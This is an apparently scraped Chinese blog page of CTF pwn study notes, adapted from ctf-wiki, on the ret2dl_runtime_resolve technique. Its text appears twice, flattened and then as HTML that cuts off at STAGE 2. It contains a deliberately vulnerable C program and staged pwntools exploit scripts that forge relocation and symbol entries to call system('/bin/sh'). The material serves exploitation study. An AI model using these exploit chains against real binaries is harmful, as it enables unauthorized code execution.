函数指针。而PLT[0]就是将GOT[1]压栈，PLT[1]就是跳转到GOT[2]的地址。ret2_dl_runtime_resolve那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下  控制程序执行 dl_resolve 函数          给定 Link_map 以及 index 两个参数。      当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。        控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。  伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。  伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。此外，这个攻击成功的很必要的条件dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。dl_resolve 函数最后的解析根本上依赖于所给定的字符串。注意：  符号版本信息          最好使得 ndx = VERSYM[(reloc-&gt;r_info) » 8] 的值为 0，以便于防止找不到的情况。        重定位表项          r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。      实现ret2dl源代码：#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln(){    char buf[100];    setbuf(stdin, buf);    read(0, buf, 256);}int main(){    char buf[100] = &quot;Welcome to XDCTF2015~!\n&quot;;    setbuf(stdout, buf);    write(1, buf, strlen(buf));    vuln();    return 0;}编译成32位，只开个NX就行。很明显就是个栈溢出，我们首先找到ret的offset，用gef的pattern就能发现是112了。其实常规做法也能做，脚本如下：rop = ROP(elf)rop.call(&#39;write&#39;, [1, elf.got[&#39;write&#39;], 4])rop.raw(elf.sym[&#39;_start&#39;])s.recv()s.send(flat([cyclic(112), rop.chain()]))libc.address = u32(s.recv(4)) - libc.symbols[&#39;write&#39;]log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc.address))s.recv()one_shot = libc.address + 0x3e7d6s.send(flat([cyclic(112), one_shot, &#39;\x00&#39; * 0x38]))s.interactive()就是泄露got表，然后第二次one_gadget大法就行了。。STAGE 1但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步：  将栈迁移到 bss 段。  控制 write 函数输出相应字符串。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;rop.write(1, base_stage + 80, len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 2在这一阶段，我们将会利用 dlresolve 相关的知识来控制程序执行 write 函数。这里我们主要是利用 plt[0] 中的相关指令，即 GOT[2] push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rop.raw(plt0)rop.raw(write_index)## fake ret addr of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 3这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。脚本如下：rop = ROP(elf)# 自定义stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr# push offset in PLTwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;)# ELF_REL：r_offset and r_info of write@pltr_offset = u32(rel_plt.data()[write_index:write_index + 4])r_info = u32(rel_plt.data()[write_index + 4:write_index + 8])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt.header.sh_addr# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(r_offset)rop.raw(r_info)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()最后结果如下，这次我们在 bss 段伪造了一个假的 write 的重定位项，仍然输出了对应的字符串。STAGE 4stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607»8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。通过伪造fake .dynsym和fake .rel.pltrop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# fake symfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# dynsym index of symindex_dynsym = (fake_sym_addr - dynsym) / 0x10# fake item(write) of .dynsymfake_write_sym = flat([0x4c, 0, 0, 0x12])# fake write relocationr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# fake dynsym (align to 0x10)rop.raw(fake_write_sym)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 5这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;write\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()STAGE 6这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(base_stage + 80)rop.raw(&#39;aaaa&#39;)rop.raw(&#39;bbbb&#39;)# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;system\x00\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()漏洞利用方式  控制eip为PLT[0]的地址，只需传递一个index_arg参数  控制index_arg的大小，使reloc的位置落在可控地址内  伪造reloc的内容，使sym落在可控地址内  伪造sym的内容，使name落在可控地址内  伪造name为任意库函数，如system工具攻击#!/usr/bin/env python# -*- coding: utf-8 -*-__author__ = &#39;zjgcjy&#39;import osimport syssys.path.append(&#39;/home/zjgcjy/roputils&#39;)from roputils import *from pwn import process, gdb, context#from LibcSearcher import *#context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = process(&#39;./main&#39;)context.log_level = &#39;debug&#39;s.recv()rop = ROP(&#39;./main&#39;)offset = 112bss_base = rop.section(&#39;.bss&#39;)buf = rop.fill(offset)buf += rop.call(&#39;read&#39;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)s.send(buf)buf = rop.string(&#39;/bin/sh&#39;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &#39;system&#39;)buf += rop.fill(100, buf)s.send(buf)s.interactive()">
    <meta itemprop="datePublished" content="March 03, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Pwnit 5
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  6 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#_dl_runtime_resolve过程">_dl_runtime_resolve过程</a>
    <ul>
      <li><a href="#延迟绑定">延迟绑定</a></li>
    </ul>
  </li>
  <li><a href="#ret2_dl_runtime_resolve">ret2_dl_runtime_resolve</a></li>
  <li><a href="#实现ret2dl">实现ret2dl</a>
    <ul>
      <li><a href="#stage-1">STAGE 1</a></li>
      <li><a href="#stage-2">STAGE 2</a></li>
      <li><a href="#stage-3">STAGE 3</a></li>
      <li><a href="#stage-4">STAGE 4</a></li>
      <li><a href="#stage-5">STAGE 5</a></li>
      <li><a href="#stage-6">STAGE 6</a></li>
      <li><a href="#漏洞利用方式">漏洞利用方式</a></li>
      <li><a href="#工具攻击">工具攻击</a></li>
    </ul>
  </li>
</ul>
            </nav>
          </aside>
        
        <blockquote>
  <p>pwn学习资料，来自ctf-wiki。
高级 ROP ret2dl</p>
</blockquote>

<hr />

<h1 id="_dl_runtime_resolve过程">_dl_runtime_resolve过程</h1>

<p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用<code class="highlighter-rouge">_dl_runtime_resolve(link_map_obj, reloc_index)</code>，这里以 32 位为例（64 位类似），具体的过程如下。</p>

<ul>
  <li>根据 reloc_index 计算相应的重定位表项：**Elf32_Rel *reloc = JMPREL + reloc_index **</li>
</ul>

<p>reloc_index 就是plt中表项的第二条指令，会将一个index压栈。</p>

<p>而如果一个可执行文件参与动态链接，它的程序头部表将包含类型为<code class="highlighter-rouge">PT_DYNAMIC</code>的段，它包含<code class="highlighter-rouge">.dynamic</code>节。结构如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
 <span class="n">Elf32_Sword</span> <span class="n">d_tag</span><span class="p">;</span>
 <span class="k">union</span> <span class="p">{</span>
 <span class="n">Elf32_Word</span> <span class="n">d_val</span><span class="p">;</span>
 <span class="n">Elf32_Addr</span> <span class="n">d_ptr</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Elf32_Dyn</span><span class="p">;</span>
</code></pre></div></div>

<p>其中，d_tag 的取值决定了该如何解释 d_un。而公式中的JMPREL 是.rel.plt的TAG。根据下面这个表格可知，d_ptr包含了plt表的首地址。</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">名称</th>
      <th style="text-align: center">数值</th>
      <th style="text-align: center">d_un</th>
      <th style="text-align: center">可执行</th>
      <th style="text-align: center">共享 目标</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">DT_JMPREL</td>
      <td style="text-align: center">23</td>
      <td style="text-align: center">d_ptr</td>
      <td style="text-align: center">可选</td>
      <td style="text-align: center">可选</td>
      <td style="text-align: center">该类型的条目的 d_ptr 成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。</td>
    </tr>
  </tbody>
</table>

<p><img src="images/Snipaste_2019-03-05_14-34-51.png" alt="Snipaste_2019-03-05_14-34-51" /></p>

<p>所以Elf32_Rel *reloc这个对象就指向.rel.plt的表项。这个结构体如下所示。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">Elf32_Addr</span>        <span class="n">r_offset</span><span class="p">;</span>
    <span class="n">Elf32_Word</span>       <span class="n">r_info</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th style="text-align: center">成员</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">r_offset</td>
      <td style="text-align: center"><strong>此成员给出了需要重定位的位置</strong>。对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的<strong>虚拟地址</strong>，一般而言，也就是说我们所说的 GOT 表的地址。</td>
    </tr>
    <tr>
      <td style="text-align: center">r_info</td>
      <td style="text-align: center"><strong>此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。</strong> 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。</td>
    </tr>
  </tbody>
</table>

<p><img src="images/Snipaste_2019-03-05_14-55-32.png" alt="Snipaste_2019-03-05_14-55-32" /></p>

<p>当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ELF32_R_SYM(i)    ((i)&gt;&gt;8)
#define ELF32_R_TYPE(i)   ((unsigned char)(i))
#define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))
</span></code></pre></div></div>

<ul>
  <li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：<strong>(reloc-&gt;r_info)»8</strong></li>
</ul>

<p><img src="images/Snipaste_2019-03-05_14-56-32.png" alt="Snipaste_2019-03-05_14-56-32" /></p>

<p>比如我选取write函数，write函数的r_offset=0x0804a01c，也就是got表地址，即.got.plt节，而r_info=0x707。所以这时候索引就是7。</p>

<ul>
  <li>继而得到对应的符号：<strong>Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)»8)]</strong></li>
</ul>

<p><img src="images/Snipaste_2019-03-05_15-02-27.png" alt="Snipaste_2019-03-05_15-02-27" /></p>

<p>这一步就是查找.dynsym这个节就行了，因为索引已经给出了。</p>

<ul>
  <li>判断符号的类型是否为 R_386_JMP_SLOT：<strong>assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</strong></li>
</ul>

<p>然后通过ELF32_R_TYPE(0x707)判断是不是 7，对应<code class="highlighter-rouge">R_386_JUMP_SLOT</code>。</p>

<p><img src="images/Snipaste_2019-03-05_15-23-10.png" alt="Snipaste_2019-03-05_15-23-10" /></p>

<p>通过<code class="highlighter-rouge">.dynsym</code>节，根据索引和项大小，得到字符串在<code class="highlighter-rouge">.dynstr</code>节的偏移量，然后得到符号write。</p>

<p>TODO:</p>

<ul>
  <li><strong>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</strong>
    <ul>
      <li>if (sym-&gt;st_other) &amp; 3 == 0 )</li>
      <li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li>
    </ul>
  </li>
  <li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。
    <ul>
      <li><strong>uint16_t ndx = VERSYM[(reloc-&gt;r_info) » 8]</strong></li>
      <li><strong>r_found_version *version = &amp;l-&gt;l_version[ndx]</strong></li>
    </ul>
  </li>
  <li>根据 name 来寻找相应函数在库中的地址。
    <ul>
      <li>name = STRTAB + sym-&gt;st_name</li>
    </ul>
  </li>
</ul>

<p><img src="images/Snipaste_2019-03-05_16-38-31.png" alt="Snipaste_2019-03-05_16-38-31" /></p>

<h2 id="延迟绑定">延迟绑定</h2>

<p>其他没什么好说的，讲了好几遍了，就上个图，记住got表首部的几个值，其中GOT[0]，指向的是.dynamic 节的首地址。而 GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。最后 GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数指针。而PLT[0]就是将GOT[1]压栈，PLT[1]就是跳转到GOT[2]的地址。</p>

<p><img src="images/Snipaste_2019-03-05_15-44-24.png" alt="Snipaste_2019-03-05_15-44-24" /></p>

<h1 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve</h1>

<p>那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p>

<ul>
  <li>控制程序执行 dl_resolve 函数
    <ul>
      <li>给定 Link_map 以及 index 两个参数。</li>
      <li>当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。</li>
    </ul>
  </li>
  <li>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</li>
  <li>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</li>
  <li>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</li>
</ul>

<p>此外，这个攻击成功的很必要的条件
<strong>dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</strong>
<strong>dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</strong>
注意：</p>

<ul>
  <li>符号版本信息
    <ul>
      <li>最好使得 ndx = VERSYM[(reloc-&gt;r_info) » 8] 的值为 0，以便于防止找不到的情况。</li>
    </ul>
  </li>
  <li>重定位表项
    <ul>
      <li>r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</li>
    </ul>
  </li>
</ul>

<h1 id="实现ret2dl">实现ret2dl</h1>

<p>源代码：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">vuln</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>编译成32位，只开个NX就行。
很明显就是个栈溢出，我们首先找到ret的offset，用gef的pattern就能发现是112了。
其实常规做法也能做，脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s">'write'</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="mi">4</span><span class="p">])</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_start'</span><span class="p">])</span>

<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">),</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()]))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">one_shot</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3e7d6</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">),</span> <span class="n">one_shot</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mh">0x38</span><span class="p">]))</span>

<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>就是泄露got表，然后第二次one_gadget大法就行了。。</p>

<p><img src="images/Snipaste_2019-03-06_10-28-19.png" alt="Snipaste_2019-03-06_10-28-19" /></p>

<h2 id="stage-1">STAGE 1</h2>

<p>但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步：</p>

<ol>
  <li>将栈迁移到 bss 段。</li>
  <li>控制 write 函数输出相应字符串。</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1"># stack pivoting, set esp = base_stage
</span><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">rop</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="c1">#s.recv()
</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="images/Snipaste_2019-03-06_11-14-36.png" alt="Snipaste_2019-03-06_11-14-36" /></p>

<h2 id="stage-2">STAGE 2</h2>

